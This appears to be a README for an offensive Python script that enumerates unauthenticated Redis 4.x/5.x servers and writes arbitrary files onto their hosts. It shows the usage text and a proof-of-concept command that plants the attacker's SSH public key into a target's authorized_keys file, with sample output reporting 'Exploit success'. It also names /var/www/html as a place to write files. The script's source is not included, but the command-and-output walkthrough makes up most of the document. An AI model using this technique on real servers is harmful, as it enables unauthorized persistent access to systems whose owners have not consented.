# Redis-Server-Exploit-Enum
This script enumerate a Redis server, it can also write a file in the server running Redis if authentification is not required 

## Usage

```
usage: redis-exploit.py [-h] [-a ACTION] -r RHOST [-p RPORT] [-f FILE]
                        [-d PATH] [-n NAME]

Redis 4.x/5.x Write a file into the box running the Redis server without authentication

optional arguments:
  -h, --help            show this help message and exit
  -a ACTION, --action ACTION
                        type of action (enum|exploit) by default action=enum
  -r RHOST, --rhost RHOST
                        target host
  -p RPORT, --rport RPORT
                        target redis port, default 6379
  -f FILE, --file FILE  file to write in the redis server
  -d PATH, --path PATH  The Path to the directory where we want to write the
                        file in redis server, '/var/www/html/' per example
  -n NAME, --name NAME  The name of the file to write in the redis server

```

## Poc

#### Verify the authentication and enumerate the Redis server :

```
$ python redis-exploit.py  -r 10.x.x.x
```

#### Exploit the server 

```
$ python redis-exploit.py -a exploit -r 10.x.x.x -f ~/.ssh/id_rsa.pub -d /home/user/.ssh/  -n authorized_keys
	*********************************************************************
* [+] [Exploit] The Authentication to redis server is not required **
* [+] [Exploit] Exploiting misconfigured REDIS SERVER ***************


* [+] [Exploit] Writing the file in the redis server ***********
OK
OK
OK

Change to directory /home/user/.ssh/ success
OK



OK

File saved

* [+] [Exploit] Exploit success !

```

